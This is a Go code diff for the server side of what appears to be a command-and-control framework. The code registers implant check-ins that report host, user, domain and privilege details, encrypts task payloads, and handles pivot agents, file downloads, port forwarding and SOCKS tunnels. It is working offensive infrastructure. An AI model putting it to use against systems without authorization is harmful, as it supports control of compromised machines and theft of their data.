@@ -3,7 +3,7 @@ package agent
 import (
 	"bytes"
 	"encoding/binary"
-	"encoding/hex"
+	//"encoding/hex"
 	"encoding/json"
 	"errors"
 	"fmt"
@@ -30,51 +30,121 @@ func BuildPayloadMessage(Jobs []Job, AesKey []byte, AesIv []byte) []byte {
 		DataPayload        []byte
 		PayloadPackage     []byte
 		PayloadPackageSize = make([]byte, 4)
+		RequestID          = make([]byte, 4)
 		DataCommandID      = make([]byte, 4)
 	)
 
 	for _, job := range Jobs {
+
 		for i := range job.Data {
+
 			switch job.Data[i].(type) {
+			case int:
+				var integer32 = make([]byte, 4)
+
+				binary.LittleEndian.PutUint32(integer32, uint32(job.Data[i].(int)))
+
+				DataPayload = append(DataPayload, integer32...)
+
+				break
+
 			case int64:
-				var xUint32 = make([]byte, 4)
-				binary.LittleEndian.PutUint32(xUint32, uint32(job.Data[i].(int64)))
-				DataPayload = append(DataPayload, xUint32...)
+				var integer64 = make([]byte, 8)
+
+				binary.LittleEndian.PutUint64(integer64, uint64(job.Data[i].(int64)))
+
+				DataPayload = append(DataPayload, integer64...)
+
+				break
+
+			case uint64:
+				var integer64 = make([]byte, 8)
+
+				binary.LittleEndian.PutUint64(integer64, uint64(job.Data[i].(uint64)))
+
+				DataPayload = append(DataPayload, integer64...)
+
 				break
 
 			case int32:
 				var integer32 = make([]byte, 4)
-				binary.LittleEndian.PutUint32(integer32, uint32(job.Data[i].(int32)))
-				DataPayload = append(DataPayload, integer32...)
-				break
 
-			case int:
-				var integer32 = make([]byte, 4)
-				binary.LittleEndian.PutUint32(integer32, uint32(job.Data[i].(int)))
+				binary.LittleEndian.PutUint32(integer32, uint32(job.Data[i].(int32)))
+
 				DataPayload = append(DataPayload, integer32...)
+
 				break
 
 			case uint32:
 				var integer32 = make([]byte, 4)
+
 				binary.LittleEndian.PutUint32(integer32, job.Data[i].(uint32))
+
 				DataPayload = append(DataPayload, integer32...)
+
+				break
+
+			case int16:
+				var integer16 = make([]byte, 2)
+
+				binary.LittleEndian.PutUint16(integer16, uint16(job.Data[i].(int16)))
+
+				DataPayload = append(DataPayload, integer16...)
+
+				break
+
+			case uint16:
+				var integer16 = make([]byte, 2)
+
+				binary.LittleEndian.PutUint16(integer16, job.Data[i].(uint16))
+
+				DataPayload = append(DataPayload, integer16...)
+
 				break
 
 			case string:
 				var size = make([]byte, 4)
-				binary.LittleEndian.PutUint32(size, uint32(len(job.Data[i].(string))))
+
+				str := job.Data[i].(string)
+
+				// in C, strings terminate with a null-byte
+				if strings.HasSuffix(str, "\x00") == false {
+					str += "\x00"
+				}
+
+				binary.LittleEndian.PutUint32(size, uint32(len(str)))
+
 				DataPayload = append(DataPayload, size...)
-				DataPayload = append(DataPayload, []byte(job.Data[i].(string))...)
+				DataPayload = append(DataPayload, []byte(str)...)
+
 				break
 
 			case []byte:
 				var size = make([]byte, 4)
+
 				binary.LittleEndian.PutUint32(size, uint32(len(job.Data[i].([]byte))))
+
 				DataPayload = append(DataPayload, size...)
 				DataPayload = append(DataPayload, job.Data[i].([]byte)...)
+
 				break
+
+			case byte:
+				var singlebyte = make([]byte, 1)
+
+				singlebyte[0] = job.Data[i].(byte)
+
+				DataPayload = append(DataPayload, singlebyte...)
+
+				break
+
+			default:
+				logger.Error(fmt.Sprintf("Could not package, unknown data type: %v", job.Data[i]))
 			}
 		}
+
+		binary.LittleEndian.PutUint32(RequestID, job.RequestID)
+		PayloadPackage = append(PayloadPackage, RequestID...)
 
 		binary.LittleEndian.PutUint32(DataCommandID, job.Command)
 		PayloadPackage = append(PayloadPackage, DataCommandID...)
@@ -83,21 +153,22 @@ func BuildPayloadMessage(Jobs []Job, AesKey []byte, AesIv []byte) []byte {
 		PayloadPackage = append(PayloadPackage, PayloadPackageSize...)
 
 		if len(DataPayload) > 0 {
-			logger.Debug("DataPayload: \n", hex.Dump(DataPayload))
 			DataPayload = crypt.XCryptBytesAES256(DataPayload, AesKey, AesIv)
 			PayloadPackage = append(PayloadPackage, DataPayload...)
 			DataPayload = nil
 		}
 	}
 
-	logger.Debug("PayloadPackage:\n", hex.Dump(PayloadPackage))
+	//logger.Debug("PayloadPackage:\n", hex.Dump(PayloadPackage))
 
 	return PayloadPackage
 }
 
-func AgentParseHeader(data []byte) (Header, error) {
-	var Header = Header{}
-	var Parser = parser.NewParser(data)
+func ParseHeader(data []byte) (Header, error) {
+	var (
+		Header = Header{}
+		Parser = parser.NewParser(data)
+	)
 
 	if Parser.Length() > 4 {
 		Header.Size = Parser.ParseInt32()
@@ -119,22 +190,24 @@ func AgentParseHeader(data []byte) (Header, error) {
 
 	Header.Data = Parser
 
-	logger.Debug(fmt.Sprintf("Header Size       : %d", Header.Size))
-	logger.Debug(fmt.Sprintf("Header MagicValue : %x", Header.MagicValue))
-	logger.Debug(fmt.Sprintf("Header AgentID    : %x", Header.AgentID))
-	logger.Debug(fmt.Sprintf("Header Data       : \n%v", hex.Dump(Header.Data.Buffer())))
+	// logger.Debug(fmt.Sprintf("Header Size       : %d", Header.Size))
+	// logger.Debug(fmt.Sprintf("Header MagicValue : %x", Header.MagicValue))
+	// logger.Debug(fmt.Sprintf("Header AgentID    : %x", Header.AgentID))
+	// logger.Debug(fmt.Sprintf("Header Data       : \n%v", hex.Dump(Header.Data.Buffer())))
 
 	return Header, nil
 }
 
-func AgentRegisterInfoToInstance(Header Header, RegisterInfo map[string]any) *Agent {
-	var agent = &Agent{
-		Active:     false,
-		SessionDir: "",
+func RegisterInfoToInstance(Header Header, RegisterInfo map[string]any) *Agent {
+	var (
+		agent = &Agent{
+			Active:     false,
+			SessionDir: "",
 
-		Info: new(AgentInfo),
-	}
-	var err error
+			Info: new(AgentInfo),
+		}
+		err error
+	)
 
 	agent.NameID = fmt.Sprintf("%x", Header.AgentID)
 	agent.Info.MagicValue = Header.MagicValue
@@ -170,7 +243,7 @@ func AgentRegisterInfoToInstance(Header Header, RegisterInfo map[string]any) *Ag
 	if val, ok := RegisterInfo["Process ID"]; ok {
 		agent.Info.ProcessPID, err = strconv.Atoi(val.(string))
 		if err != nil {
-			logger.Debug("Couldn't parse ProcessID integer from string: " + err.Error())
+			logger.DebugError("Couldn't parse ProcessID integer from string: " + err.Error())
 			agent.Info.ProcessPID = 0
 		}
 	}
@@ -178,7 +251,7 @@ func AgentRegisterInfoToInstance(Header Header, RegisterInfo map[string]any) *Ag
 	if val, ok := RegisterInfo["Process Parent ID"]; ok {
 		agent.Info.ProcessPPID, err = strconv.Atoi(val.(string))
 		if err != nil {
-			logger.Debug("Couldn't parse ProcessPPID integer from string: " + err.Error())
+			logger.DebugError("Couldn't parse ProcessPPID integer from string: " + err.Error())
 			agent.Info.ProcessPPID = 0
 		}
 	}
@@ -210,25 +283,28 @@ func AgentRegisterInfoToInstance(Header Header, RegisterInfo map[string]any) *Ag
 	return agent
 }
 
-func ParseResponse(AgentID int, Parser *parser.Parser) *Agent {
-	logger.Debug("Response:\n" + hex.Dump(Parser.Buffer()))
+func ParseDemonRegisterRequest(AgentID int, Parser *parser.Parser, ExternalIP string) *Agent {
+	//logger.Debug("Response:\n" + hex.Dump(Parser.Buffer()))
 
 	var (
-		MagicValue  int
-		DemonID     int
-		Hostname    string
-		DomainName  string
-		Username    string
-		InternalIP  string
-		ProcessName string
-		ProcessPID  int
-		OsVersion   []int
-		OsArch      int
-		Elevated    int
-		ProcessArch int
-		ProcessPPID int
-		SleepDelay  int
-		AesKeyEmpty = make([]byte, 32)
+		MagicValue   int
+		DemonID      int
+		Hostname     string
+		DomainName   string
+		Username     string
+		InternalIP   string
+		ProcessName  string
+		ProcessPID   int
+		OsVersion    []int
+		OsArch       int
+		Elevated     int
+		ProcessArch  int
+		ProcessPPID  int
+		SleepDelay   int
+		SleepJitter  int
+		KillDate     int64
+		WorkingHours int32
+		AesKeyEmpty  = make([]byte, 32)
 	)
 
 	/*
@@ -239,9 +315,9 @@ func ParseResponse(AgentID int, Parser *parser.Parser) *Agent {
 		[ AES KEY      ] 32 bytes
 		[ AES IV       ] 16 bytes
 		AES Encrypted {
-			[ Agent ID     ] 4 bytes // <-- this is needed to check if we successfully decrypted the data
-			[ User Name    ] size + bytes
+			[ Agent ID     ] 4 bytes <-- this is needed to check if we successfully decrypted the data
 			[ Host Name    ] size + bytes
+			[ User Name    ] size + bytes
 			[ Domain       ] size + bytes
 			[ IP Address   ] 16 bytes?
 			[ Process Name ] size + bytes
@@ -255,238 +331,348 @@ func ParseResponse(AgentID int, Parser *parser.Parser) *Agent {
 		}
 	*/
 
-	var Session = &Agent{
-		Encryption: struct {
-			AESKey []byte
-			AESIv  []byte
-		}{
-			AESKey: Parser.ParseAtLeastBytes(32),
-			AESIv:  Parser.ParseAtLeastBytes(16),
-		},
+	if Parser.Length() >= 32+16 {
 
-		Active:     false,
-		SessionDir: "",
+		var Session = &Agent{
+			Encryption: struct {
+				AESKey []byte
+				AESIv  []byte
+			}{
+				AESKey: Parser.ParseAtLeastBytes(32),
+				AESIv:  Parser.ParseAtLeastBytes(16),
+			},
 
-		Info: new(AgentInfo),
-	}
+			Active:     false,
+			SessionDir: "",
 
-	logger.Debug("AES KEY\n" + hex.Dump(Session.Encryption.AESKey))
-	logger.Debug("AES IV :\n" + hex.Dump(Session.Encryption.AESIv))
+			Info: new(AgentInfo),
+		}
 
-	logger.Debug("Buffer:\n" + hex.Dump(Parser.Buffer()))
-	if bytes.Compare(Session.Encryption.AESKey, AesKeyEmpty) != 0 {
-		Parser.DecryptBuffer(Session.Encryption.AESKey, Session.Encryption.AESIv)
-	}
-	logger.Debug("After Dec:\n" + hex.Dump(Parser.Buffer()))
+		// check if there is aes key/iv.
+		if bytes.Compare(Session.Encryption.AESKey, AesKeyEmpty) != 0 {
+			Parser.DecryptBuffer(Session.Encryption.AESKey, Session.Encryption.AESIv)
+		}
 
-	DemonID = Parser.ParseInt32()
-	logger.Debug(fmt.Sprintf("Parsed DemonID: %x", DemonID))
+		if Parser.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadBytes, parser.ReadBytes, parser.ReadBytes, parser.ReadBytes, parser.ReadBytes, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt64, parser.ReadInt32}) {
+			DemonID = Parser.ParseInt32()
+			logger.Debug(fmt.Sprintf("Parsed DemonID: %x", DemonID))
 
-	if AgentID != DemonID {
-		if AgentID != 0 {
-			logger.Debug("Failed to decrypt agent init request")
+			if AgentID != DemonID {
+				if AgentID != 0 {
+					logger.Debug("Failed to decrypt agent init request")
+					return nil
+				}
+			} else {
+				logger.Debug(fmt.Sprintf("AgentID (%x) == DemonID (%x)\n", AgentID, DemonID))
+			}
+
+			Hostname = Parser.ParseString()
+			Username = Parser.ParseString()
+			DomainName = Parser.ParseString()
+			InternalIP = Parser.ParseString()
+
+			if ExternalIP != "" {
+				Session.Info.ExternalIP = ExternalIP
+			}
+
+			logger.Debug(fmt.Sprintf(
+				"\n"+
+					"Hostname: %v\n"+
+					"Username: %v\n"+
+					"Domain  : %v\n"+
+					"InternIP: %v\n"+
+					"ExternIP: %v\n",
+				Hostname, Username, DomainName, InternalIP, ExternalIP))
+
+			ProcessName = Parser.ParseString()
+			ProcessPID = Parser.ParseInt32()
+			ProcessPPID = Parser.ParseInt32()
+			ProcessArch = Parser.ParseInt32()
+			Elevated = Parser.ParseInt32()
+
+			logger.Debug(fmt.Sprintf(
+				"\n"+
+					"ProcessName: %v\n"+
+					"ProcessPID : %v\n"+
+					"ProcessPPID: %v\n"+
+					"ProcessArch: %v\n"+
+					"Elevated   : %v\n",
+				ProcessName, ProcessPID, ProcessPPID, ProcessArch, Elevated))
+
+			OsVersion = []int{Parser.ParseInt32(), Parser.ParseInt32(), Parser.ParseInt32(), Parser.ParseInt32(), Parser.ParseInt32()}
+			OsArch = Parser.ParseInt32()
+			SleepDelay = Parser.ParseInt32()
+			SleepJitter = Parser.ParseInt32()
+			KillDate = Parser.ParseInt64()
+			WorkingHours = int32(Parser.ParseInt32())
+
+			logger.Debug(fmt.Sprintf(
+				"\n"+
+					"SleepDelay  : %v\n"+
+					"SleepJitter : %v\n",
+				SleepDelay, SleepJitter))
+
+			Session.Active = true
+
+			Session.NameID = fmt.Sprintf("%x", DemonID)
+			Session.Info.MagicValue = MagicValue
+			Session.Info.FirstCallIn = time.Now().Format("02/01/2006 15:04:05")
+			Session.Info.LastCallIn = time.Now().Format("02-01-2006 15:04:05.999")
+			Session.Info.Hostname = Hostname
+			Session.Info.DomainName = DomainName
+			Session.Info.Username = Username
+			Session.Info.InternalIP = InternalIP
+			Session.Info.SleepDelay = SleepDelay
+			Session.Info.SleepJitter = SleepJitter
+			Session.Info.KillDate = KillDate
+			Session.Info.WorkingHours = WorkingHours
+
+			// Session.Info.Listener 	= t.Name
+
+			switch ProcessArch {
+
+			case PROCESS_ARCH_UNKNOWN:
+				Session.Info.ProcessArch = "Unknown"
+				break
+
+			case PROCESS_ARCH_X64:
+				Session.Info.ProcessArch = "x64"
+				break
+
+			case PROCESS_ARCH_X86:
+				Session.Info.ProcessArch = "x86"
+				break
+
+			case PROCESS_ARCH_IA64:
+				Session.Info.ProcessArch = "IA64"
+				break
+
+			default:
+				Session.Info.ProcessArch = "Unknown"
+				break
+
+			}
+
+			Session.Info.OSVersion = getWindowsVersionString(OsVersion)
+
+			switch OsArch {
+			case 0:
+				Session.Info.OSArch = "x86"
+			case 9:
+				Session.Info.OSArch = "x64/AMD64"
+			case 5:
+				Session.Info.OSArch = "ARM"
+			case 12:
+				Session.Info.OSArch = "ARM64"
+			case 6:
+				Session.Info.OSArch = "Itanium-based"
+			default:
+				Session.Info.OSArch = "Unknown (" + strconv.Itoa(OsArch) + ")"
+			}
+
+			Session.Info.Elevated = "false"
+			if Elevated == 1 {
+				Session.Info.Elevated = "true"
+			}
+
+			process := strings.Split(ProcessName, "\\")
+
+			Session.Info.ProcessName = process[len(process)-1]
+			Session.Info.ProcessPID = ProcessPID
+			Session.Info.ProcessPPID = ProcessPPID
+			Session.Info.ProcessPath = ProcessName
+			Session.BackgroundCheck = false
+
+			/*for {
+			    if Parser.Length() >= 4 {
+			        var Option = Parser.ParseInt32()
+
+			        switch Option {
+			        case DEMON_CHECKIN_OPTION_PIVOTS:
+			            logger.Debug("DEMON_CHECKIN_OPTION_PIVOTS")
+			              var PivotCount = Parser.ParseInt32()
+
+			              logger.Debug("PivotCount: ", PivotCount)
+
+			              for {
+			                  if PivotCount == 0 {
+			                      break
+			                  }
+
+			                  var (
+			                      PivotAgentID = Parser.ParseInt32()
+			                      PivotPackage = Parser.ParseBytes()
+			                      PivotParser  = parser.NewParser(PivotPackage)
+			                      PivotSession *Agent
+			                  )
+
+			                  var (
+			                      _             = PivotParser.ParseInt32()
+			                      HdrMagicValue = PivotParser.ParseInt32()
+			                      _             = PivotParser.ParseInt32()
+			                      _             = PivotParser.ParseInt32()
+			                  )
+
+			                  PivotSession = ParseDemonRegisterRequest(PivotAgentID, PivotParser, RoutineFunc)
+			                  if PivotSession != nil {
+			                      PivotSession.Info.MagicValue = HdrMagicValue
+
+			                      LogDemonCallback(PivotSession)
+			                      RoutineFunc.AppendDemon(PivotSession)
+			                      pk := RoutineFunc.EventNewDemon(PivotSession)
+			                      RoutineFunc.EventAppend(pk)
+			                      RoutineFunc.EventBroadcast("", pk)
+
+			                      go PivotSession.BackgroundUpdateLastCallbackUI(RoutineFunc)
+
+			                      Session.Pivots.Links = append(Session.Pivots.Links, PivotSession)
+
+			                      PivotSession.Pivots.Parent = Session
+			                  }
+
+			                  PivotCount--
+			              }
+
+			            break
+			        }
+
+			    } else {
+			        break
+			    }
+			}*/
+
+			logger.Debug("Finished parsing demon")
+
+			return Session
+		} else {
+			logger.Debug(fmt.Sprintf("Agent: %x, Command: REGISTER, Invalid packet", AgentID))
 			return nil
 		}
-	} else {
-		logger.Debug(fmt.Sprintf("AgentID (%x) == DemonID (%x)\n", AgentID, DemonID))
-	}
 
-	if Parser.Length() >= 4 {
-		Hostname = string(Parser.ParseBytes())
 	} else {
-		logger.Debug("Failed to parse agent request")
+		logger.Debug(fmt.Sprintf("Agent: %x, Command: REGISTER, Invalid packet", AgentID))
 		return nil
 	}
+}
 
-	if Parser.Length() >= 4 {
-		Username = string(Parser.ParseBytes())
-	} else {
-		logger.Debug("Failed to parse agent request")
-		return nil
+// check that the request the agent is valid
+func (a *Agent) IsKnownRequestID(RequestID uint32, CommandID uint32) bool {
+	// some commands are always accepted because they don't follow the "send task and get response" format
+	switch CommandID {
+	case COMMAND_SOCKET:
+		return true
+	case COMMAND_PIVOT:
+		return true
 	}
 
-	if Parser.Length() >= 4 {
-		DomainName = string(Parser.ParseBytes())
-	} else {
-		logger.Debug("Failed to parse agent request")
-		return nil
+	for i := range a.Tasks {
+		if a.Tasks[i].RequestID == RequestID {
+			return true
+		}
 	}
+	return false
+}
 
-	if Parser.Length() >= 4 {
-		InternalIP = string(Parser.ParseBytes())
-	} else {
-		logger.Debug("Failed to parse agent request")
-		return nil
+// the operator added a new request/command
+func (a *Agent) AddRequest(job Job) []Job {
+	a.Tasks = append(a.Tasks, job)
+	return a.Tasks
+}
+
+// after a request has been completed, we can forget about the RequestID so that it is no longer valid
+func (a *Agent) RequestCompleted(RequestID uint32) {
+	for i := range a.Tasks {
+		if a.Tasks[i].RequestID == RequestID {
+			a.Tasks = append(a.Tasks[:i], a.Tasks[i+1:]...)
+			break
+		}
 	}
-
-	logger.Debug(fmt.Sprintf(
-		"\n"+
-			"Hostname: %v\n"+
-			"Username: %v\n"+
-			"Domain  : %v\n"+
-			"InternIP: %v\n",
-		Hostname, Username, DomainName, InternalIP))
-
-	ProcessName = string(Parser.ParseBytes())
-	ProcessPID = Parser.ParseInt32()
-	ProcessPPID = Parser.ParseInt32()
-	ProcessArch = Parser.ParseInt32()
-	Elevated = Parser.ParseInt32()
-
-	logger.Debug(fmt.Sprintf(
-		"\n"+
-			"ProcessName: %v\n"+
-			"ProcessPID : %v\n"+
-			"ProcessPPID: %v\n"+
-			"ProcessArch: %v\n"+
-			"Elevated   : %v\n",
-		ProcessName, ProcessPID, ProcessPPID, ProcessArch, Elevated))
-
-	OsVersion = []int{Parser.ParseInt32(), Parser.ParseInt32(), Parser.ParseInt32(), Parser.ParseInt32(), Parser.ParseInt32()}
-	OsArch = Parser.ParseInt32()
-	SleepDelay = Parser.ParseInt32()
-
-	Session.Active = true
-
-	Session.NameID = fmt.Sprintf("%x", DemonID)
-	Session.Info.MagicValue = MagicValue
-	Session.Info.FirstCallIn = time.Now().Format("02/01/2006 15:04:05")
-	Session.Info.LastCallIn = time.Now().Format("02-01-2006 15:04:05.999")
-	Session.Info.Hostname = Hostname
-	Session.Info.DomainName = DomainName
-	Session.Info.Username = Username
-	Session.Info.InternalIP = InternalIP
-	Session.Info.SleepDelay = SleepDelay
-
-	// Session.Info.ExternalIP 	= strings.Split(connection.RemoteAddr().String(), ":")[0]
-	// Session.Info.Listener 	= t.Name
-
-	switch ProcessArch {
-
-	case PROCESS_ARCH_UNKNOWN:
-		Session.Info.ProcessArch = "Unknown"
-		break
-
-	case PROCESS_ARCH_X64:
-		Session.Info.ProcessArch = "x64"
-		break
-
-	case PROCESS_ARCH_X86:
-		Session.Info.ProcessArch = "x86"
-		break
-
-	case PROCESS_ARCH_IA64:
-		Session.Info.ProcessArch = "IA64"
-		break
-
-	default:
-		Session.Info.ProcessArch = "Unknown"
-		break
-
-	}
-
-	Session.Info.OSVersion = getWindowsVersionString(OsVersion)
-
-	switch OsArch {
-	case 0:
-		Session.Info.OSArch = "x86"
-	case 9:
-		Session.Info.OSArch = "x64/AMD64"
-	case 5:
-		Session.Info.OSArch = "ARM"
-	case 12:
-		Session.Info.OSArch = "ARM64"
-	case 6:
-		Session.Info.OSArch = "Itanium-based"
-	default:
-		Session.Info.OSArch = "Unknown (" + strconv.Itoa(OsArch) + ")"
-	}
-
-	Session.Info.Elevated = "false"
-	if Elevated == 1 {
-		Session.Info.Elevated = "true"
-	}
-
-	process := strings.Split(ProcessName, "\\")
-
-	Session.Info.ProcessName = process[len(process)-1]
-	Session.Info.ProcessPID = ProcessPID
-	Session.Info.ProcessPPID = ProcessPPID
-	Session.Info.ProcessPath = ProcessName
-	Session.BackgroundCheck = false
-
-	/*for {
-	    if Parser.Length() >= 4 {
-	        var Option = Parser.ParseInt32()
-
-	        switch Option {
-	        case DEMON_CHECKIN_OPTION_PIVOTS:
-	            logger.Debug("DEMON_CHECKIN_OPTION_PIVOTS")
-	              var PivotCount = Parser.ParseInt32()
-
-	              logger.Debug("PivotCount: ", PivotCount)
-
-	              for {
-	                  if PivotCount == 0 {
-	                      break
-	                  }
-
-	                  var (
-	                      PivotAgentID = Parser.ParseInt32()
-	                      PivotPackage = Parser.ParseBytes()
-	                      PivotParser  = parser.NewParser(PivotPackage)
-	                      PivotSession *Agent
-	                  )
-
-	                  var (
-	                      _             = PivotParser.ParseInt32()
-	                      HdrMagicValue = PivotParser.ParseInt32()
-	                      _             = PivotParser.ParseInt32()
-	                      _             = PivotParser.ParseInt32()
-	                  )
-
-	                  PivotSession = ParseResponse(PivotAgentID, PivotParser, RoutineFunc)
-	                  if PivotSession != nil {
-	                      PivotSession.Info.MagicValue = HdrMagicValue
-
-	                      LogDemonCallback(PivotSession)
-	                      RoutineFunc.AppendDemon(PivotSession)
-	                      pk := RoutineFunc.EventNewDemon(PivotSession)
-	                      RoutineFunc.EventAppend(pk)
-	                      RoutineFunc.EventBroadcast("", pk)
-
-	                      go PivotSession.BackgroundUpdateLastCallbackUI(RoutineFunc)
-
-	                      Session.Pivots.Links = append(Session.Pivots.Links, PivotSession)
-
-	                      PivotSession.Pivots.Parent = Session
-	                  }
-
-	                  PivotCount--
-	              }
-
-	            break
-	        }
-
-	    } else {
-	        break
-	    }
-	}*/
-
-	logger.Debug("Finished parsing demon")
-
-	return Session
 }
 
 func (a *Agent) AddJobToQueue(job Job) []Job {
-	a.JobQueue = append(a.JobQueue, job)
+	// store the RequestID									
+	a.AddRequest(job)
+	// if it's a pivot agent then add the job to the parent
+	if a.Pivots.Parent != nil {
+		//logger.Debug("Prepare command for pivot demon: " + a.NameID)
+		a.PivotAddJob(job)
+		// if it's a direct agent add the job to the direct agent
+	} else {
+		a.JobQueue = append(a.JobQueue, job)
+	}
 	return a.JobQueue
 }
 
 func (a *Agent) GetQueuedJobs() []Job {
-	var Jobs = a.JobQueue
+	var Jobs []Job
+	var JobsSize = 0
+	var NumJobs = 0
 
-	a.JobQueue = nil
+	// make sure we return a number of jobs that doesn't exeed DEMON_MAX_RESPONSE_LENGTH
+	for _, job := range a.JobQueue {
+
+		for i := range job.Data {
+
+			switch job.Data[i].(type) {
+			case int:
+				JobsSize += 4
+				break
+
+			case int64:
+				JobsSize += 8
+				break
+
+			case uint64:
+				JobsSize += 8
+				break
+
+			case int32:
+				JobsSize += 4
+				break
+
+			case uint32:
+				JobsSize += 4
+				break
+
+			case int16:
+				JobsSize += 2
+				break
+
+			case uint16:
+				JobsSize += 2
+				break
+
+			case string:
+				JobsSize += 4 + len(job.Data[i].(string))
+				break
+
+			case []byte:
+				JobsSize += 4 + len(job.Data[i].([]byte))
+				break
+
+			case byte:
+				JobsSize += 1
+				break
+
+			default:
+				logger.Error(fmt.Sprintf("Could determine package size, unknown data type: %v", job.Data[i]))
+			}
+		}
+
+		if JobsSize >= DEMON_MAX_RESPONSE_LENGTH {
+			break
+		}
+
+		NumJobs++
+	}
+
+	// if there is a very large job, send it anyways
+	if len(a.JobQueue) > 0 && NumJobs == 0 {
+		NumJobs = 1
+	}
+
+	// return NumJobs and leave the rest on the JobQueue
+	Jobs, a.JobQueue = a.JobQueue[:NumJobs], a.JobQueue[NumJobs:]
 
 	return Jobs
 }
@@ -501,7 +687,7 @@ func (a *Agent) UpdateLastCallback(Teamserver TeamServer) {
 
 	diff := NewLastCallIn.Sub(OldLastCallIn)
 
-	Teamserver.AgentLastTimeCalled(a.NameID, diff.String())
+	Teamserver.AgentLastTimeCalled(a.NameID, diff.String(), a.Info.LastCallIn, a.Info.SleepDelay, a.Info.SleepJitter, a.Info.KillDate, a.Info.WorkingHours)
 }
 
 func (a *Agent) BackgroundUpdateLastCallbackUI(teamserver TeamServer) {
@@ -529,7 +715,7 @@ func (a *Agent) BackgroundUpdateLastCallbackUI(teamserver TeamServer) {
 
 		diff := NewLastCallIn.Sub(OldLastCallIn)
 
-		teamserver.AgentLastTimeCalled(a.NameID, diff.String())
+		teamserver.AgentLastTimeCalled(a.NameID, diff.String(), a.Info.LastCallIn, a.Info.SleepDelay, a.Info.SleepJitter, a.Info.KillDate, a.Info.WorkingHours)
 
 		time.Sleep(time.Second * 1)
 	}
@@ -555,11 +741,16 @@ func (a *Agent) PivotAddJob(job Job) {
 	Packer.AddInt32(int32(AgentID))
 	Packer.AddBytes(Payload)
 
+	// add this job to pivot queue.
+	// tho it's not going to be used besides for the task size calculator
+	// which is going to be displayed to the operator.
+	a.JobQueue = append(a.JobQueue, job)
+
 	PivotJob = Job{
 		Command: COMMAND_PIVOT,
 		Data: []interface{}{
-			AGENT_PIVOT_SMB_COMMAND,
-			AgentID,
+			DEMON_PIVOT_SMB_COMMAND,
+			uint32(AgentID),
 			Packer.Buffer(),
 		},
 	}
@@ -588,8 +779,8 @@ func (a *Agent) PivotAddJob(job Job) {
 		PivotJob = Job{
 			Command: COMMAND_PIVOT,
 			Data: []interface{}{
-				AGENT_PIVOT_SMB_COMMAND,
-				AgentID,
+				DEMON_PIVOT_SMB_COMMAND,
+				uint32(AgentID),
 				Packer.Buffer(),
 			},
 		}
@@ -597,7 +788,7 @@ func (a *Agent) PivotAddJob(job Job) {
 		pivots = &pivots.Parent.Pivots
 	}
 
-	pivots.Parent.AddJobToQueue(PivotJob)
+	pivots.Parent.JobQueue = append(pivots.Parent.JobQueue, PivotJob)
 }
 
 func (a *Agent) DownloadAdd(FileID int, FilePath string, FileSize int) error {
@@ -649,29 +840,27 @@ func (a *Agent) DownloadAdd(FileID int, FilePath string, FileSize int) error {
 	return nil
 }
 
-func (a *Agent) DownloadWrite(FileID int, data []byte) {
+func (a *Agent) DownloadWrite(FileID int, data []byte) error {
 	for i := range a.Downloads {
 		if a.Downloads[i].FileID == FileID {
 			_, err := a.Downloads[i].File.Write(data)
 			if err != nil {
 				a.Downloads[i].File, err = os.Create(a.Downloads[i].LocalFile)
 				if err != nil {
-					logger.Error("Failed to create file: " + err.Error())
-					return
+					return errors.New("Failed to create file: " + err.Error())
 				}
 
 				_, err = a.Downloads[i].File.Write(data)
 				if err != nil {
-					logger.Error("Failed to write to file [" + a.Downloads[i].LocalFile + "]: " + err.Error())
+					return errors.New("Failed to write to file [" + a.Downloads[i].LocalFile + "]: " + err.Error())
 				}
 
 				a.Downloads[i].Progress += len(data)
-
-				break
 			}
-			break
+			return nil
 		}
 	}
+	return errors.New(fmt.Sprintf("FileID not found: %x", FileID))
 }
 
 func (a *Agent) DownloadClose(FileID int) {
@@ -748,6 +937,7 @@ func (a *Agent) PortFwdOpen(SocketID int) error {
 				return err
 			}
 
+			break;
 		}
 
 	}
@@ -784,6 +974,7 @@ func (a *Agent) PortFwdWrite(SocketID int, data []byte) error {
 				return errors.New("portfwd connection is empty")
 			}
 
+			break;
 		}
 
 	}
@@ -823,6 +1014,7 @@ func (a *Agent) PortFwdRead(SocketID int) ([]byte, error) {
 				return nil, errors.New("portfwd connection is empty")
 			}
 
+			break;
 		}
 
 	}
@@ -855,21 +1047,29 @@ func (a *Agent) PortFwdClose(SocketID int) {
 			/* remove the socket from the array */
 			a.PortFwds = append(a.PortFwds[:i], a.PortFwds[i+1:]...)
 
+			break;
 		}
 
 	}
 
 }
 
-func (a *Agent) SocksClientAdd(SocketID int32, conn net.Conn) *SocksClient {
+func (a *Agent) SocksClientAdd(SocketID int32, conn net.Conn, ATYP byte, IpDomain []byte, Port uint16) *SocksClient {
+
+	a.SocksCliMtx.Lock()
 
 	var client = new(SocksClient)
 
 	client.SocketID = SocketID
 	client.Conn = conn
 	client.Connected = false
+	client.ATYP = ATYP
+	client.IpDomain = IpDomain
+	client.Port = Port
 
 	a.SocksCli = append(a.SocksCli, client)
+
+	a.SocksCliMtx.Unlock()
 
 	return client
 }
@@ -921,6 +1121,7 @@ func (a *Agent) SocksClientRead(SocketID int) ([]byte, error) {
 				return nil, errors.New("socks proxy connection is empty")
 			}
 
+			break;
 		}
 
 	}
@@ -933,7 +1134,9 @@ func (a *Agent) SocksClientRead(SocketID int) ([]byte, error) {
 	return read, nil
 }
 
-func (a *Agent) SocksClientClose(SocketID int) {
+func (a *Agent) SocksClientClose(SocketID int32) {
+
+	a.SocksCliMtx.Lock()
 
 	for i := range a.SocksCli {
 
@@ -951,10 +1154,11 @@ func (a *Agent) SocksClientClose(SocketID int) {
 			/* remove the socks server from the array */
 			a.SocksCli = append(a.SocksCli[:i], a.SocksCli[i+1:]...)
 
+			break
 		}
-
 	}
 
+	a.SocksCliMtx.Unlock()
 }
 
 func (a *Agent) SocksServerRemove(Addr string) {
@@ -974,34 +1178,43 @@ func (a *Agent) SocksServerRemove(Addr string) {
 			/* remove the socket from the array */
 			a.SocksSvr = append(a.SocksSvr[:i], a.SocksSvr[i+1:]...)
 
+			break;
 		}
 
 	}
 
 }
 
+// ToMap returns the agent info as a map
 func (a *Agent) ToMap() map[string]interface{} {
-	var TempParent = a.Pivots.Parent
-	var InfoMap = structs.Map(a)
+	var (
+		ParentAgent *Agent
+		Info        map[string]any
+		MagicValue  string
+	)
 
